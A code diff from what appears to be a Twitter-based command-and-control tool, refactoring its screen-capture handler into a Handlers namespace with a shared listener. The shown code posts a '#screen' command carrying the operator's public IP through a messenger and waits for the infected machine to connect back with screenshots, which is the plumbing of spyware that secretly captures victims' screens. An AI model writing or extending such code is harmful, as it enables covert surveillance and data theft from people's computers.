@@ -10,12 +10,14 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using TwitterCommandAndControl.Core;
 
-namespace TwitterCommandAndControl
+namespace TwitterCommandAndControl.Handlers
 {
-    public static class ScreenCaptureHandler
+    public class ScreenCaptureHandler : Handler
     {
-        private const int PORT = 8888;
+        private ScreenCaptureHandler() : base() { }
+
         public static void Respond(string command)
         {
             NetworkStream networkStream = null;
@@ -58,17 +60,10 @@ namespace TwitterCommandAndControl
 
         public static TcpClient Request(string commandPrefix)
         {
-            TcpClient client = null;
-            var listenerTask = Task.Factory.StartNew(() =>
-            {
-                TcpListener listener = new TcpListener(IPAddress.Any, PORT);
-                listener.Start();
-                client = listener.AcceptTcpClient();
-                listener.Stop();
-            });
+            var listenerTask = NextClient();
             Messenger.Send(commandPrefix + " #screen #ip=" + GetPublicIP.GetIP());
             listenerTask.Wait();
-            return client;
+            return listenerTask.Result;
         }
 
         #region Screen Capture Helper Classes
